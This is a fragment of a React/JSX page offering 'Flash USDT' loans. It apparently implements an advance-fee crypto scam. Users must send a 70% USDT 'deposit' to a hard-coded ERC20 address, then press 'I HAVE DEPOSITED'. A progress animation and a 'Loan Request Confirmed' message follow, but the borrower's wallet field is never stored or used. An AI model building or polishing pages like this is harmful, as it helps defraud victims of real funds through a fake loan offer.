                </div>

                {submissionStatus === 'confirmed' ? (
                  <div className="text-center space-y-8 py-10">
                    <div className="w-24 h-24 bg-emerald-500/10 rounded-[2rem] flex items-center justify-center mx-auto shadow-inner border border-emerald-500/20">
                      <CheckCircle2 className="w-12 h-12 text-emerald-500" />
                    </div>
                    <div className="space-y-4">
                      <h3 className="text-3xl font-black uppercase tracking-tight text-white">Loan Request Confirmed</h3>
                      <p className="text-slate-300 text-sm max-w-xs mx-auto font-medium leading-relaxed">
                        Your deposit is being verified and your Flash USDT loan will be sent shortly.
                      </p>
                    </div>
                  </div>
                ) : submissionStatus === 'processing' ? (
                  <div className="text-center space-y-8 py-10">
                    <div className="relative w-32 h-32 mx-auto flex items-center justify-center">
                      <div className="absolute inset-0 border-4 border-slate-800 rounded-full" />
                      <motion.div 
                        className="absolute inset-0 border-4 border-emerald-500 rounded-full"
                        style={{ clipPath: 'polygon(50% 0%, 100% 0%, 100% 100%, 50% 100%, 50% 50%)' }}
                        animate={{ rotate: 360 }}
                        transition={{ duration: 2, repeat: Infinity, ease: 'linear' }}
                      />
                      <div className="text-2xl font-black text-white">{progress}%</div>
                    </div>
                    <p className="text-slate-400 uppercase font-bold tracking-widest text-sm animate-pulse">Processing...</p>
                  </div>
                ) : (
                  <div className="space-y-8">
                    <div className="bg-slate-900 rounded-3xl p-6 border border-white/10 text-center">
                      <div className="flex flex-col items-center justify-center mb-4 space-y-2">
                        <label className="block text-xs font-black text-slate-500 uppercase tracking-widest">Loan Calculator</label>
                        <span className="text-[10px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded-md uppercase tracking-wider">Min 1000 USDT</span>
                      </div>
                      <div className="relative w-full max-w-xs mx-auto">
                        <input 
                          type="number" 
                          value={loanAmount}
                          onChange={(e) => setLoanAmount(e.target.value)}
                          min="1000"
                          className="w-full bg-slate-950 text-white border border-white/10 rounded-2xl px-6 py-4 focus:ring-1 focus:ring-emerald-500 font-bold text-lg text-center pl-10"
                          placeholder="1000"
                        />
                        <span className="absolute left-6 top-1/2 -translate-y-1/2 text-slate-500 font-black border-r border-white/10 pr-4">$</span>
                      </div>
                      <div className="mt-6 space-y-3">
                        <div className="flex flex-col justify-center items-center text-sm bg-slate-950/50 p-4 rounded-xl border border-white/5 space-y-1">
                          <span className="text-slate-400 font-bold uppercase tracking-widest text-[10px]">You Will Receive:</span>
                          <span className="text-white font-black text-lg">{Number(loanAmount || 0).toLocaleString()} <span className="text-emerald-500">Flash USDT</span></span>
                        </div>
                        <div className="flex flex-col justify-center items-center text-sm bg-emerald-500/10 p-4 rounded-xl border border-emerald-500/20 space-y-1">
                          <span className="text-emerald-500 font-bold uppercase tracking-widest text-[10px]">Required Deposit (70%):</span>
                          <span className="text-emerald-500 font-black text-lg">{(Number(loanAmount || 0) * 0.7).toLocaleString()} USDT</span>
                        </div>
                      </div>
                    </div>

                    <div className="bg-slate-900 rounded-3xl p-6 border border-white/10 space-y-4 text-center">
                      <div className="flex flex-col items-center gap-3 p-4 rounded-2xl bg-orange-500/10 border border-orange-500/20">
                        <AlertCircle className="w-8 h-8 text-orange-500 shrink-0" />
                        <p className="text-[10px] text-orange-400 font-bold leading-relaxed uppercase tracking-tight italic">
                          NOTE: YOU MUST DEPOSIT THE REQUIRED AMOUNT TO THIS ADDRESS ON THE <span className="font-black text-white px-0.5">ERC 20 NETWORK</span>
                        </p>
                      </div>
                      <div className="w-full bg-slate-950 border border-white/10 rounded-2xl p-5 flex items-center justify-between relative group shadow-2xl">
                        <code className="text-[11px] font-mono text-white break-all max-w-[80%] font-bold tracking-tight">
                          {ERC20_PAYMENT_ADDRESS}
                        </code>
                        <button 
                          onClick={copyAddress}
                          className={`p-3.5 rounded-xl transition-all hover:scale-110 active:scale-95 shadow-xl ${
                            isCopied ? 'bg-green-500 text-slate-950' : 'bg-emerald-500 text-slate-950 shadow-emerald-500/20'
                          }`}
                        >
                          {isCopied ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                        </button>
                        {isCopied && (
                          <div className="absolute -top-10 right-0 bg-green-500 text-slate-950 text-[10px] font-black px-3 py-1 rounded-lg uppercase tracking-widest animate-bounce">
                            Copied to Protocol
                          </div>
                        )}
                      </div>
                    </div>

                    <form onSubmit={handleSubmission} className="space-y-6">
                      <div className="space-y-3 text-center">
                        <label className="text-[11px] font-black text-slate-500 uppercase tracking-widest px-1 block">Your Receiving Wallet Address</label>
                        <input 
                          required
                          type="text" 
                          placeholder="Address we should send the loan to" 
                          className="w-full bg-slate-950 text-white border border-white/10 rounded-2xl px-6 py-4 font-bold text-sm focus:ring-1 focus:ring-emerald-500 text-center"
                        />
                      </div>
                      
                      <div className="space-y-3 text-center">
                        <label className="text-[11px] font-black text-slate-500 uppercase tracking-widest px-1 block">Receiving Network</label>
                        <div className="flex justify-center gap-3 w-full max-w-xs mx-auto">
                          {['TRC20', 'BEP20'].map((network) => (
                            <button
                              type="button"
                              key={network}
                              onClick={() => setLoanNetwork(network as Network)}
                              className={`flex-1 py-4 rounded-2xl border font-black text-xs tracking-widest uppercase transition-all ${
                                loanNetwork === network 
                                  ? 'bg-emerald-500/10 border-emerald-500 text-emerald-500' 
                                  : 'bg-slate-950 border-white/10 text-slate-500 hover:border-white/20'
                              }`}
                            >
                              {network}
                            </button>
                          ))}
                        </div>
                      </div>

                      <button 
                        type="submit"
                        className="w-full py-5 mt-4 rounded-3xl bg-gradient-to-r from-emerald-500 to-emerald-400 text-slate-950 font-black text-lg tracking-tight uppercase transition-all hover:scale-[1.02]"
                      >
                        I HAVE DEPOSITED
                      </button>
                    </form>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        </div>
      )}
      </AnimatePresence>

      {/* Decorative Background */}
      <div className="fixed inset-0 pointer-events-none z-[-1] overflow-hidden grayscale-[0.5] opacity-[0.4]">
        <div className="absolute top-0 right-0 w-[800px] h-[800px] bg-emerald-500/5 blur-[150px] rounded-full" />
        <div className="absolute bottom-[-10%] left-[-10%] w-[600px] h-[600px] bg-emerald-500/5 blur-[120px] rounded-full" />
        <div className="absolute inset-0 opacity-[0.05] bg-[radial-gradient(#ffffff_1px,transparent_1px)] [background-size:60px_60px]" />
      </div>

    </div>
  );
}
